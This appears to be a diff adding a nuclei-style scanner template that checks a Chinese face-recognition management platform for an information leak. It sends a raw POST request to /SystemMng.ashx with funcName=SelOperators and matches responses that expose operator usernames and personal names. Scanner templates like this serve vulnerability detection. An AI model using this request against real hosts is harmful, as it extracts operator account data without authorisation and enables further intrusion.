@@ -1,0 +1,36 @@
+id: poc-yaml-lian-ai-yun-seloperators-info-leak
+info:
+  name: 脸爱云一脸通智慧平台 SelOperators 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - raw:
+      - |
+        POST /SystemMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&funcName=SelOperators
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"rows":'
+        part: body
+      - type: regex
+        regex:
+          - '"username\\":\\"[a-zA-Z]+\\"'
+        part: body
+      - type: regex
+        regex:
+          - '"people_name\\":\\"[\u4e00-\u9fa5]+\\"'
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
